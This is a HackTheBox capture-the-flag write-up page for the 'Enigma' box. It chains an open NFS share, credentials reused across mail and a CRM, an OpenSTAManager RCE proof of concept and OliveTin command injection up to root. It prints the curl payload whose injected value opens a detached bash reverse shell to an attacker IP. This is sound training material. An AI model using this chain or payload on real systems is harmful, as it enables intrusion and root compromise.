@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB: Enigma — From Onboarding Doc to Root via Misconfigured Automation</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    background-color: #0a0e27;
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.easy {
+    background: rgba(102,217,239,0.2);
+    color: #66d9ef;
+    border-color: #66d9ef;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .callout.warn {
+    background: rgba(255,208,0,0.06);
+    border-left: 3px solid #ffd000;
+    color: #d8cfa0;
+  }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  .flag-redacted {
+    color: #888;
+    font-style: italic;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+  }
+  th, td {
+    border: 1px solid #232a4d;
+    padding: 8px 12px;
+    text-align: left;
+  }
+  th {
+    color: #00ff88;
+    background: rgba(0,255,136,0.05);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Enigma — From Onboarding Doc to Root via Misconfigured Automation</h1>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag easy">EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">NFS</span>
+  <span class="tag">CREDENTIAL REUSE</span>
+  <span class="tag">CVE-2026-38751</span>
+  <span class="tag">OLIVETIN RCE</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations &nbsp;|&nbsp; Season 11
+</div>
+
+<h2>&gt; OVERVIEW</h2>
+
+<p>Enigma is an Easy-rated Linux box that reads almost like a corporate security
+audit checklist of what <em>not</em> to do: an unauthenticated NFS share leaking
+onboarding documents, password reuse across a mail server and a CRM admin
+panel, a very recent (and very real) CVE in OpenSTAManager for authenticated
+RCE, and — for the cherry on top — a root-owned automation tool sitting
+wide open on localhost with a shell-injectable "backup database" button.</p>
+
+<p>None of the individual steps were hard. What made this box interesting was
+how each weak link fed directly into the next one, which is exactly the kind
+of chain you find on real internal networks during an engagement.</p>
+
+<h2>&gt; RECON</h2>
+
+<p>Standard full TCP scan first:</p>
+
+<pre>sudo nmap -sV -sC -p- --min-rate 5000 &lt;target&gt;</pre>
+
+<p>Notable services:</p>
+
+<table>
+  <tr><th>Port</th><th>Service</th></tr>
+  <tr><td>22</td><td>OpenSSH 9.6p1 (Ubuntu)</td></tr>
+  <tr><td>80</td><td>nginx, redirects to <code>enigma.htb</code></td></tr>
+  <tr><td>110/995</td><td>POP3 / POP3S (Dovecot)</td></tr>
+  <tr><td>111/2049</td><td>rpcbind / NFS</td></tr>
+  <tr><td>143/993</td><td>IMAP / IMAPS (Dovecot)</td></tr>
+</table>
+
+<p>Two things stood out immediately: an exposed NFS share and a full mail stack
+(POP3/IMAP, both plaintext and SSL variants). That combination usually means
+there are real mailboxes to break into, and NFS is the classic Easy-box way
+to get the first foothold of information to do it.</p>
+
+<h2>&gt; NFS SHARE — THE FIRST LEAK</h2>
+
+<pre>showmount -e &lt;target&gt;
+mkdir -p /tmp/enigma-nfs
+sudo mount -t nfs &lt;target&gt;:/srv/nfs/onboarding /tmp/enigma-nfs -o nolock
+ls -la /tmp/enigma-nfs</pre>
+
+<p>The share was exported with no authentication and contained a single file:
+<code>New_Employee_Access.pdf</code>. Extracting the text:</p>
+
+<pre>pdftotext New_Employee_Access.pdf -</pre>
+
+<div class="callout">
+IT onboarding documents are a goldmine on Easy boxes — they're written for
+humans, not security, so they tend to contain real usernames, real
+passwords, and real internal URLs in plain text.
+</div>
+
+<p>The PDF handed over a working webmail credential set for an employee named
+Kevin, including a URL for an internal webmail portal
+(<code>mail001.enigma.htb</code>).</p>
+
+<h2>&gt; MAILBOX DIVING</h2>
+
+<p>Rather than mess with the webmail UI, it's faster to just talk to Dovecot
+directly:</p>
+
+<pre>openssl s_client -connect &lt;target&gt;:995 -quiet
+USER kevin
+PASS &lt;redacted&gt;
+LIST
+RETR 1</pre>
+
+<p>Kevin's inbox had a single onboarding email from a colleague, Sarah, which
+didn't contain credentials directly but confirmed a second employee account
+existed. Trying the same technique against Sarah's mailbox (same default
+password pattern the company had clearly issued) turned up the real prize:
+an internal email from IT provisioning her access to an <strong>OpenSTAManager</strong>
+CRM instance — complete with the shared <code>admin</code> account credentials, since
+her dedicated account hadn't been created yet.</p>
+
+<div class="callout warn">
+Password reuse across services (webmail defaults, shared admin creds "for
+now") was the single biggest recurring theme on this box. It showed up at
+least three separate times across the whole chain.
+</div>
+
+<h2>&gt; FOOTHOLD — OPENSTAMANAGER AUTHENTICATED RCE</h2>
+
+<p>Logging into <code>support_001.enigma.htb</code> with the leaked admin credentials
+dropped straight into a full OpenSTAManager dashboard. The <code>CHANGELOG.md</code>
+confirmed a very recent build (v2.9.8, December 2025), which ruled out most
+of the older, already-patched CVEs.</p>
+
+<p>A little research turned up <strong>CVE-2026-38751</strong>: an authenticated arbitrary
+file upload vulnerability in OpenSTAManager's module update mechanism,
+allowing a valid admin session to upload a ZIP disguised as a module
+containing a PHP webshell.</p>
+
+<p>A public Rust-based PoC automates the whole chain — login, enabling the
+updates feature, crafting the malicious ZIP with a valid module descriptor
+and an embedded shell, uploading it, and verifying execution:</p>
+
+<pre>./openstamanager-rce-exploit \
+  --url http://support_001.enigma.htb/ \
+  -U admin -P '&lt;redacted&gt;' \
+  --lhost &lt;attacker_ip&gt; --lport 4444</pre>
+
+<p>This landed a shell as <code>www-data</code>, with the webshell dropped at
+<code>/modules/shell/shell.php</code>.</p>
+
+<h2>&gt; PIVOTING TO A REAL USER</h2>
+
+<p>From <code>www-data</code>, the OpenSTAManager config file was readable and contained
+plaintext database credentials:</p>
+
+<pre>cat /var/www/html/openstamanager/config.inc.php</pre>
+
+<p>Those DB credentials didn't work directly against any system account via
+<code>su</code>, but they were valid for the MySQL instance itself. Dumping the
+application's own <code>zz_users</code> table (its internal user/auth table) turned up
+a bcrypt password hash for a user called <code>haris</code> — notably the <em>only</em>
+account on the box with an actual login shell (everyone else was
+<code>/usr/sbin/nologin</code>, mail/web-only accounts).</p>
+
+<pre>mysql -u &lt;db_user&gt; -p'&lt;db_pass&gt;' -h localhost openstamanager \
+  -e "SELECT * FROM zz_users\G"</pre>
+
+<p>The hash cracked almost instantly against rockyou with John the Ripper —
+a nice thematic touch, given the DB password itself had been a variation on
+"friends":</p>
+
+<pre>john --wordlist=/usr/share/wordlists/rockyou.txt haris_hash.txt</pre>
+
+<p>Password recovered, straight <code>su</code> into haris, and grabbed the user flag.</p>
+
+<pre>haris@enigma:~$ cat user.txt
+<span class="flag-redacted">[user flag captured ✅]</span></pre>
+
+<h2>&gt; PRIVESC — OLIVETIN RUNNING AS ROOT</h2>
+
+<p>No sudo rights for haris, no juicy SUID binaries, nothing unusual in cron.
+The real lead came from simply looking at the current working directory
+after landing the shell — it was sitting inside
+<code>/var/www/olivetin/</code>.</p>
+
+<p><a href="https://olivetin.app" target="_blank">OliveTin</a> is a self-hosted web
+UI that runs predefined shell commands/scripts as buttons behind a browser.
+Checking the running process and systemd unit confirmed it:</p>
+
+<pre>ps aux | grep -i olivetin
+# root  1539  ...  /usr/local/bin/OliveTin</pre>
+
+<p>Running as <strong>root</strong>, with no <code>User=</code> directive in its systemd unit, and bound
+only to <code>127.0.0.1:1337</code>. Reading its config file
+(<code>/etc/OliveTin/config.yaml</code>) revealed a whole set of predefined actions —
+most were harmless demo entries (ping, disk space, dmesg) straight out of
+OliveTin's default example config. One, however, stood out:</p>
+
+<pre>- title: Backup Database
+  id: backup_database
+  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
+  arguments:
+    - name: db_user
+      type: ascii_identifier
+    - name: db_pass
+      type: password
+    - name: db_name
+      type: ascii_identifier</pre>
+
+<div class="callout warn">
+<code>db_user</code> and <code>db_name</code> are typed as <code>ascii_identifier</code>, which restricts
+input to safe characters. <code>db_pass</code> is typed as <code>password</code> — no such
+restriction. Since the shell template drops that value straight inside a
+single-quoted string with no escaping, a value like <code>'; &lt;anything&gt;; '</code>
+breaks out of the quoting and injects arbitrary shell commands.
+</div>
+
+<p>The config also had <code>authRequireGuestsToLogin: false</code> and default
+permissions of <code>exec: true</code> — meaning no login was even required to trigger
+actions against this instance.</p>
+
+<p>OliveTin's actual API turned out to be a Connect-RPC service reachable over
+plain HTTP/JSON at <code>/api/StartAction</code> (found by grepping the compiled
+frontend bundle for the real route, since the binary's internal protobuf
+service name was <em>not</em> the actual HTTP path). Triggering the backup action
+with a malicious <code>db_pass</code>:</p>
+
+<pre>curl -s -X POST http://127.0.0.1:1337/api/StartAction \
+  -H "Content-Type: application/json" \
+  -H "Connect-Protocol-Version: 1" \
+  -d '{
+    "bindingId": "backup_database",
+    "arguments": [
+      {"name": "db_user", "value": "x"},
+      {"name": "db_pass", "value": "'"'"'; setsid nohup bash -c \"bash -i >&amp; /dev/tcp/&lt;attacker_ip&gt;/4446 0&gt;&amp;1\" &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp; disown; '"'"'"},
+      {"name": "db_name", "value": "x"}
+    ]
+  }'</pre>
+
+<div class="callout">
+First attempt used a plain inline reverse shell payload and it connected —
+but died within a second, because it was a direct child of the action's
+process tree and got reaped when OliveTin considered the action "complete."
+Wrapping the payload in <code>setsid nohup ... &amp; disown</code> detaches it into its own
+session so it survives past the parent action's lifecycle. Worth remembering
+for any action-runner / task-automation RCE in the future.
+</div>
+
+<p>Listener catches the callback as root:</p>
+
+<pre>nc -lvnp 4446
+...
+root@enigma:/# id
+uid=0(root) gid=0(root)</pre>
+
+<pre>root@enigma:~# cat /root/root.txt
+<span class="flag-redacted">[root flag captured ✅]</span></pre>
+
+<h2>&gt; ATTACK CHAIN SUMMARY</h2>
+
+<ol>
+  <li>Unauthenticated NFS share exposes an IT onboarding PDF with real webmail credentials</li>
+  <li>POP3/IMAP mailbox access reveals a second employee and, via an internal email thread, shared admin credentials for an internal CRM (OpenSTAManager)</li>
+  <li>Authenticated arbitrary file upload (CVE-2026-38751) in OpenSTAManager's module update system → webshell → <code>www-data</code></li>
+  <li>Readable app config leaks plaintext DB credentials</li>
+  <li>DB access dumps the app's own user table, yielding a bcrypt hash for the box's only real shell account</li>
+  <li>Hash cracks instantly against rockyou → <code>su</code> to that user → user flag</li>
+  <li>OliveTin automation tool found running as root, bound to localhost, with no auth required</li>
+  <li>Unsanitized <code>password</code>-typed argument in a shell template allows command injection via the "Backup Database" action</li>
+  <li>Detached reverse shell payload survives the action's process lifecycle → root</li>
+</ol>
+
+<h2>&gt; LESSONS LEARNED</h2>
+
+<ul>
+  <li>NFS shares are still one of the fastest ways to leak sensitive files on Linux boxes — always check <code>showmount -e</code> early.</li>
+  <li>Password reuse across unrelated services (mail, CRM, DB) is the connective tissue of most "Easy" chains. Always test the same password everywhere once you have one.</li>
+  <li>Not every input field in a config-driven tool is sanitized the same way — mixed argument types (<code>ascii_identifier</code> vs <code>password</code>) in the same action are worth specifically checking for injection.</li>
+  <li>When a reverse shell dies immediately after connecting from a webshell/automation tool, suspect the parent process is reaping its children — detach with <code>setsid</code>/<code>nohup</code>/<code>disown</code> before assuming the exploit failed.</li>
+  <li>Internal admin tools (OliveTin, and tools like it — Ansible AWX, Rundeck, Jenkins) running as root and reachable without auth are a recurring real-world privesc pattern, not just a lab contrivance.</li>
+</ul>
+
+<hr class="divider">
+
+<p style="color:#6a7a85; font-size:0.85em;">
+Scarif Operations &nbsp;|&nbsp; th3m4dh4ck3r.com &nbsp;|&nbsp; CPTS prep, Season 11
+</p>
+
+</body>
+</html>
